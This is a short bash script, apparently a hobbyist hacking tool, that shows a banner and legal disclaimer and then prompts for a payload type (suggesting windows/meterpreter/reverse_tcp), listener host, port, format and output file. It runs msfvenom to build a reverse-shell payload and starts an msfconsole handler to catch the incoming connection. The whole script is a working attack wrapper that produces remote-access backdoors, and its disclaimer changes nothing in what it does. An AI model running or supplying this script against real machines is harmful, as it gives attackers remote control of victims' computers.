#!/bin/bash
# 
#                  Created By Mustafa Husaieen .
#                 Website: https://3oraqi.webs.com
#                https://www.youtube.com/c/insta1m5t 
#             instagram :  https://www.facebook.com/1m5t    







function about {
clear
echo -e "\e[0;33m                       _____   ____   ____   ____   ____   _                     \e[0m" 
echo -e "\e[1;33m                       \__  \ /  _ \ /  __\ /  _ \ /  _ \ / \                    \e[0m" 
echo -e "\e[1;33m                         /  | | / \| |  \/| | / \| | / \| | |                    \e[0m" 
echo -e "\e[0;31m                        _\  | | \_/| |    / | |-|| | \_\| | |                    \e[0m" 
echo -e "\e[1;31m                       /____/ \____/ \_/\_\ \_/ \| \____\ \_/                    \e[0m"

echo -e "\e[1;36m $cyan        ╔────────────────────────────────────────────────────────────────╗"
echo -e "\e[1;36m $cyan        |$white$yellow  attacking targets without prior mutual consent is ILLEGAL.    $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$yellow  Developers are not responsible for any damage caused by this  $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$yellow  script.                                                       $cyan| \e[0m"
echo -e "\e[1;33m $cyan        |$white$red                        STAY LEGAL !!                           $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$green                    .:.:. Contact .:.:.                         $cyan| \e[0m"                          
echo -e "\e[1;36m $cyan        |$white$green  Github  $white:$blue     https://github.com/3oraqi                       $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$green  Youtube $white:$blue    www.youtube.com/c/insta1m5t/                     $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$green  Website $white:$blue        3oraqi.webs.com/                             $cyan| \e[0m"
echo -e "\e[1;36m $cyan        |$white$green  insta   $white:$blue  https://www.instagram.com/1m5t/                    $cyan| \e[0m"
echo -e "\e[1;36m $cyan        ╘────────────────────────────────────────────────────────────────╝$nc \n\e[0m"

}
about
function a {

sleep 5
echo -e "\e[0;34m                                 Coded By 3oraqi                                                        \e[0m"
sleep 1
echo -e "\e[0;34m                               wait a few seconds ..                                                    \e[0m"
sleep 5
sleep 5
read -p " windows/meterpreter/reverse_tcp .. :# " pay
read -p " enter LHOST ,, :# " lhost
read -p " enter LPORT .. :# " lport
read -p " enter format file ..;# " format
read -p " enter out file ..:# " out

xterm -e "msfvenom -p $pay LHOST=$lhost LPORT=$lport -f $format -o $out"
 }
a


function b {
msfconsole -q -x "handler -p $pay -H $lhost -P $lport"
}
b
